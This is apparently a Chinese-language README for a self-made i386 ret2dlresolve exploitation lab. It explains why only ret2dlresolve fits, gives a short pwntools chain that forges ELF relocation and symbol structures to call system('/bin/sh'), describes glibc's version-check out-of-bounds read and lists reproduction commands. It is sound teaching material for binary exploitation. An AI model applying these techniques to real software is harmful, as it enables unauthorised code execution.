# lab_ret2dlresolve_i386 —— 自造 ret2dlresolve 靶场（L3）

> **这是自造实验，不是真实赛题。** 目的：二进制"没有 `system`、也没有 `/bin/sh`"，
> 但又是动态链接的，于是只能**伪造 ELF 结构**让动态链接器自己去 libc 里解析 `system`。

---

## 1. 题目行为

```text
$ ./chal
data:      <- read(0, esp, 0x200)   栈溢出，chain[0] 就是 [esp]
```

保护（`checksec`）：

| 项 | 值 |
| --- | --- |
| 架构 | i386，**动态链接**（glibc 2.24 i386，随目录归档在 `libc/`） |
| 导入符号 | **只有 `read`**（有 `.dynsym` / `.dynstr` / `.rel.plt` / PLT0，但没有 `system`） |
| PIE | 无（`0x8048000`） |
| NX | 开启 |
| canary | 无 |
| RELRO | Partial RELRO |

## 2. 为什么必须 ret2dlresolve

| 排除项 | 原因 |
| --- | --- |
| ret2text | 没有后门 |
| ret2libc | 没有 `system` 可调，也没有任何泄漏点（不能算 libc base） |
| ret2shellcode | NX 开启 |
| ret2syscall | 也可以用 `int 0x80` 自己 execve，但本 lab 的重点是**动态链接器** |

剩下的唯一入口：`.rel.plt` 里只有 `read` 一条重定位，但 PLT0（`_dl_runtime_resolve`）
可以被我们手动调用 —— 只要伪造 `Elf32_Rel` / `Elf32_Sym` / 符号名字符串，
就能让链接器去解析**任意**符号（这里选 `system`）。

## 3. 利用链（pwntools 生成）

```python
rop = ROP(elf)
dl  = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dl.data_addr)   # 把伪造结构读进 bss
rop.ret2dlresolve(dl)       # plt0(reloc_offset) -> _dl_runtime_resolve -> system
```

链长只有 **36 字节**（`read@plt` 调用 + `plt0` + reloc 偏移 + 返回地址 + 参数），
伪造的 ELF 结构 **48 字节**，第二段 `read` 写进 `dl.data_addr`。

内存布局（`_dl_fixup` 视角）：

```text
l_info[DT_STRTAB] + reloc->r_offset?  no —— 走的是
  strtab = l_info[DT_STRTAB] + sym->st_name
  symtab = l_info[DT_SYMTAB] + symidx * sizeof(Elf32_Sym)
  reloc  = JMPREL + reloc_offset
所以伪造的三件事：符号名 "system\0"、Elf32_Sym(st_name=偏移, st_info=0x12, ...)、
Elf32_Rel(r_offset=可写地址, r_info=(symidx<<8)|7)
```

## 4. 关键坑：glibc 的 symbol version 检查

`_dl_fixup()` 在 `DT_VERSYM` 存在时会做版本校验：

```c
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) {
    const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
    ElfW(Half) ndx = vernum[symidx] & 0x7fff;   // ← 用的是真实 symtab 下标
    ...
}
```

- 伪造符号必须放在真实 `.dynsym` 之后很远的位置，`symidx` 必然很大 →
  `vernum[symidx]` 是**越界读**。
- **i386 小二进制**里这个越界地址通常还落在已映射的 `.bss` / `.data` 上（读到 0，
  版本检查直接跳过），所以能成功。
- **x86_64 + 新 glibc** 上同样的偏移容易打到未映射页 → `SIGSEGV`，这就是
  `ret2libc/25_rec_33c3_2016` 里 `pwnable.tw unexploitable` 的负结果（见
  `PATTERN_CLASSIFICATION.md` §5.6）。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn Writeups/labs/lab_ret2dlresolve_i386'
source ../../.venv/bin/activate
make            # as --32 + ld -m elf_i386，链到 libc/libc.so.6（2.24 i386）
python exp.py   # 期望 __PWNED__ + uid=...

# 显式换 loader（可选）：
LD_SO=./libc/ld-2.24.so python exp.py
```

`chal` 的 `RUNPATH` 是 `$ORIGIN/libc`、`interpreter` 是 `./libc/ld-2.24.so`，
所以在 lab 目录里直接 `./chal` 就能跑，不依赖系统的 32 位 loader。

## 6. 识别卡

```text
动态链接但导入表里没有 system / 有 read（或 puts）+ 能写已知地址（bss）
  -> ret2dlresolve：伪造 Elf32_Rel/Sym/名字 -> plt0 -> _dl_runtime_resolve -> system
先看 glibc 版本与架构：i386/老版本更宽容（version 检查越界读通常落在已映射页）
```
